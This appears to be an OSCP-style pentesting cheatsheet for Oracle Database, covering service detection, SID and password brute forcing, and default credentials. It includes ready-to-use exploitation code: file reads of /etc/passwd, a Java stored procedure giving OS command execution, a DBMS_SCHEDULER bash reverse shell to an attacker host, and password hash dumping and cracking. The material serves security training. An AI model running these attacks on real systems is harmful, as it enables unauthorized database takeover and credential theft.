# Oracle Database

> Part of [Databases](./README.md) in the [Web Application Testing Cheatsheet](../../README.md).

**Contents:**

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Default and weak credentials](#3-default-and-weak-credentials)
- [4. Known CVEs](#4-known-cves)
- [5. Exploitation](#5-exploitation)
- [6. Post-exploitation](#6-post-exploitation)
- [7. OSCP notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### 1.1 Port and service

Default port **1521** (TNS Listener). Common deviations: 1522, 1526, 2483, 2484 (TCPS).

Also **5500** (Oracle EM Express), **1158** (EM), **6200** (OAM).

```bash
# Version via TNS
nmap -sV -p 1521 <TARGET>
nmap -p 1521 --script oracle-tns-version <TARGET>

# Brute SID
nmap -p 1521 --script oracle-sid-brute <TARGET>

# Brute credentials
nmap -p 1521 --script oracle-brute --script-args oracle-brute.sid=<SID> <TARGET>
```

Expected output:

```text
1521/tcp open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauth)
```

### 1.2 SID vs Service Name

- **SID** - unique instance identifier (older Oracle).
- **Service Name** - logical service (Oracle 8i+).

Both can be used with `sqlplus`. For SID: `user/pass@host:1521/SID`. For service: `user/pass@//host:1521/SERVICE`.

### 1.3 Version to CVE mapping

| Version | Notable CVEs |
|---------|--------------|
| Oracle 9i / 10g | CVE-2006-0586 (SQL injection) |
| Oracle 10g / 11g | CVE-2012-1675 (TNS Poison) |
| Oracle 11g / 12c | CVE-2018-2874, CVE-2018-2875 |
| Oracle 12c / 19c | CVE-2020-14750 (WebLogic), CVE-2021-2294 |
| Oracle 19c / 21c | CVE-2022-21416 (TNS) |

---

## 2. Enumeration

### 2.1 Find SID / Service Name

```bash
# nmap
nmap -p 1521 --script oracle-sid-brute <TARGET>

# Metasploit
msfconsole -q -x "use auxiliary/scanner/oracle/sid_brute; set RHOSTS <TARGET>; run"

# tnscmd10g
tnscmd10g version -h <TARGET>
tnscmd10g status -h <TARGET>
```

Common SIDs: `ORCL`, `XE`, `XEXDB`, `TEST`, `DEV`.

### 2.2 Connect (with creds)

```bash
# sqlplus (preferred)
sqlplus <USER>/<PASS>@<TARGET>:1521/<SID>

# odat (offline Oracle Database Attacking Tool)
python3 odat.py all -s <TARGET>
python3 odat.py sidguesser -s <TARGET>
```

### 2.3 Once connected - enumerate

```sql
-- Version
SELECT banner FROM v$version;

-- Current user
SELECT USER FROM dual;
SELECT * FROM session_roles;

-- Databases
SELECT name FROM v$database;

-- Tables in current schema
SELECT table_name FROM user_tables;

-- All users (needs DBA)
SELECT username, account_status FROM dba_users;
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).
> The `SELECT banner FROM v$version` output proves DB access.

---

## 3. Default and weak credentials

### 3.1 Classic defaults

| User | Password | Notes |
|------|----------|-------|
| scott | tiger | Demo account, present on many installs |
| system | manager | Legacy default |
| sys | change_on_install | Legacy default (as SYSDBA) |
| dbsnmp | dbsnmp | Monitoring user |
| outln | outln | Outline user |
| ctxsys | ctxsys | Text user |

### 3.2 Brute force

```bash
# nmap NSE
nmap -p 1521 --script oracle-brute --script-args oracle-brute.sid=<SID> <TARGET>

# Metasploit
msfconsole -q -x "use auxiliary/scanner/oracle/oracle_login; set RHOSTS <TARGET>; set SID <SID>; run"

# hydra (limited Oracle support)
# odat
python3 odat.py passwordguesser -s <TARGET> -d /path/to/sid.txt --accounts-file accounts.txt
```

---

## 4. Known CVEs

| CVE | Affected | Impact | NVD |
|-----|----------|--------|-----|
| CVE-2006-0586 | Oracle 9i / 10g | SQL injection in `DBMS_METADATA` | https://nvd.nist.gov/vuln/detail/CVE-2006-0586 |
| CVE-2012-1675 | Oracle 10g / 11g | TNS Poison (MITM) | https://nvd.nist.gov/vuln/detail/CVE-2012-1675 |
| CVE-2018-2874 | Oracle 11g / 12c | RCE via Java VM | https://nvd.nist.gov/vuln/detail/CVE-2018-2874 |
| CVE-2018-2875 | Oracle 11g / 12c | Java VM privilege escalation | https://nvd.nist.gov/vuln/detail/CVE-2018-2875 |
| CVE-2021-2294 | Oracle 12c / 19c | TNS listener DoS | https://nvd.nist.gov/vuln/detail/CVE-2021-2294 |
| CVE-2022-21416 | Oracle 19c / 21c | TNS listener compromise | https://nvd.nist.gov/vuln/detail/CVE-2022-21416 |

---

## 5. Exploitation

### 5.1 File read via UTL_FILE (needs privileges)

```sql
DECLARE
  f UTL_FILE.FILE_TYPE;
  l_line VARCHAR2(32767);
BEGIN
  f := UTL_FILE.FOPEN('/etc', 'passwd', 'R');
  LOOP
    UTL_FILE.GET_LINE(f, l_line);
    DBMS_OUTPUT.PUT_LINE(l_line);
  END LOOP;
  UTL_FILE.FCLOSE(f);
EXCEPTION WHEN OTHERS THEN NULL;
END;
/
```

Requires `EXECUTE` on `UTL_FILE` and access to the directory object.

### 5.2 Read files via DBMS_LOB / BFILENAME

```sql
SELECT BFILENAME('/etc', 'passwd') FROM dual;
```

### 5.3 Java stored procedures (RCE)

If Oracle has Java VM enabled (default in 8i-12c), you can run OS commands:

```sql
-- Create Java source
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "Exec" AS
import java.io.*;
public class Exec {
  public static String run(String cmd) throws Exception {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line, out = "";
    while ((line = br.readLine()) != null) out += line + "\n";
    return out;
  }
};
/

-- Wrap in PL/SQL function
CREATE OR REPLACE FUNCTION exec_cmd(p_cmd VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA NAME 'Exec.run(java.lang.String) return java.lang.String';
/

-- Execute
SELECT exec_cmd('id') FROM dual;
SELECT exec_cmd('cat /etc/passwd') FROM dual;
```

### 5.4 DBMS_SCHEDULER (RCE)

If Java VM is disabled but you have DBA:

```sql
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name => 'pwn',
    job_type => 'EXECUTABLE',
    job_action => '/bin/bash',
    number_of_arguments => 2,
    enabled => FALSE
  );
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('pwn', 1, '-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('pwn', 2, 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1');
  DBMS_SCHEDULER.ENABLE('pwn');
END;
/
```

### 5.5 ODAT - Oracle Database Attacking Tool

```bash
# All-in-one enumeration + exploitation
python3 odat.py all -s <TARGET> -d <SID> -U <USER> -P <PASS>

# Upload a file
python3 odat.py utlfile -s <TARGET> -d <SID> -U <USER> -P <PASS> --putFile /tmp shell.jsp shell.jsp

# Execute a command
python3 odat.py dbmsscheduler -s <TARGET> -d <SID> -U <USER> -P <PASS> --exec "whoami"
```

---

## 6. Post-exploitation

### 6.1 Dump password hashes

```sql
-- DBA only
SELECT username, password FROM dba_users;
SELECT name, password FROM sys.user$;
```

Oracle password hashes are in a proprietary format (`S:` prefix, `T:` for newer). Hashcat modes: `-m 3100` (Oracle 11g), `-m 12300` (Oracle 12c+).

### 6.2 Crack hashes

```bash
hashcat -m 3100 oracle_hashes.txt /usr/share/wordlists/rockyou.txt
```

### 6.3 Read `/etc/shadow` (needs privileges)

Same UTL_FILE or Java stored procedure technique as in 5.1 / 5.3.

### 6.4 Reuse credentials

Oracle `dba_users` + app configs often share passwords with SSH / web admin panels.

---

## 7. OSCP notes

> [!IMPORTANT]
> OSCP report: screenshot the `sqlplus` / `odat` connection that proves DB access (`SELECT banner FROM v$version` output).

> [!IMPORTANT]
> OSCP report: screenshot the RCE via Java stored procedure or `DBMS_SCHEDULER` (command output).

> [!IMPORTANT]
> OSCP report: screenshot `dba_users` dump that yields hashes or credentials for lateral movement.

---

## 8. References

- Oracle official docs: https://docs.oracle.com/en/database/
- HackTricks - Oracle: https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener
- ODAT: https://github.com/quentinhardy/odat
- tnscmd10g: https://github.com/quentinhardy/tnscmd10g
- CVE-2006-0586: https://nvd.nist.gov/vuln/detail/CVE-2006-0586
- CVE-2012-1675: https://nvd.nist.gov/vuln/detail/CVE-2012-1675
- CVE-2018-2874: https://nvd.nist.gov/vuln/detail/CVE-2018-2874
- CVE-2018-2875: https://nvd.nist.gov/vuln/detail/CVE-2018-2875
- CVE-2021-2294: https://nvd.nist.gov/vuln/detail/CVE-2021-2294
- CVE-2022-21416: https://nvd.nist.gov/vuln/detail/CVE-2022-21416

---